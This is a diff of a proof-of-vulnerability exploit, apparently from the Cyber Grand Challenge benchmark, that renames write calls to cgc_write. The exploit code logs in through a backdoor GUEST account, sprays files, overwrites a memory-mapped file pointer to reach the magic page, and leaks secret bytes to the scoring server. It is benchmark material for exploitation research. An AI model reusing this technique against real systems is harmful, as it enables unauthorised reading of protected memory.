@@ -76,7 +76,7 @@ unsigned int new_offset_value;
 	// negotiate a type 2 POV
 	pov_type = 2;
 
-	if (write(3, &pov_type, sizeof(pov_type)) == -1)
+	if (cgc_write(3, &pov_type, sizeof(pov_type)) == -1)
 		_terminate(-1);
 
 	if (receive_bytes(3, &type2_addr, sizeof(type2_addr)) == -1)
@@ -92,14 +92,14 @@ unsigned int new_offset_value;
 	receive_bytes(STDIN, buffer, 7);
 	
 	// login with the backdoor GUEST account
-	write(STDOUT, "GUEST 2\n", 8);
+	cgc_write(STDOUT, "GUEST 2\n", 8);
 
 	// command prompt
 	receive_bytes(STDIN, buffer, 26);
 
 	// get rid of the README.txt file in position 0 of the file directory
 	// this position can be overwritten 
-	write(STDOUT, "erase README.txt\n", 17);
+	cgc_write(STDOUT, "erase README.txt\n", 17);
 
 	// command prompt
 	receive_bytes(STDIN, buffer, 2);
@@ -107,7 +107,7 @@ unsigned int new_offset_value;
 	// make a memory mapped file that can be overwritten to exploit the vuln
 	strcpy(buffer, "makememfile exploitme.mem 4096\n");
 	// printf();
-	write(STDOUT, buffer, strlen(buffer));
+	cgc_write(STDOUT, buffer, cgc_strlen(buffer));
 
 	receive_bytes(STDIN, buffer, 2);
 
@@ -115,7 +115,7 @@ unsigned int new_offset_value;
 	for (i = 0; i < 125; ++i ) {
 
 		sprintf(buffer, "make file$d\n", i);
-		write(STDOUT, buffer, strlen(buffer));
+		cgc_write(STDOUT, buffer, cgc_strlen(buffer));
 
 		receive_bytes(STDIN, buffer, 2);
 	}
@@ -129,20 +129,20 @@ unsigned int new_offset_value;
 	*(int *)(buffer+41) = type2_addr + 2;
 
 	buffer[45] = '\n';
-	write(STDOUT, buffer, 46);
+	cgc_write(STDOUT, buffer, 46);
 
 	receive_bytes(STDIN, buffer, 2);
 
-	// the memory mapped file should now point to the magic page so just read it to get secret data
-	write(STDOUT, "show exploitme.mem\n", 19);
+	// the memory mapped file should now point to the magic page so just cgc_read it to get secret data
+	cgc_write(STDOUT, "show exploitme.mem\n", 19);
 
 	receive_bytes(STDIN, buffer, 4);
 
-	// now write the returned data back to the POV server for scoring
-	write(3, buffer, 4);
+	// now cgc_write the returned data back to the POV server for scoring
+	cgc_write(3, buffer, 4);
 
-	// send the command to exit the CB
-	write(STDOUT, "exit\n", 5);
+	// send the command to cgc_exit the CB
+	cgc_write(STDOUT, "exit\n", 5);
 
 }
 
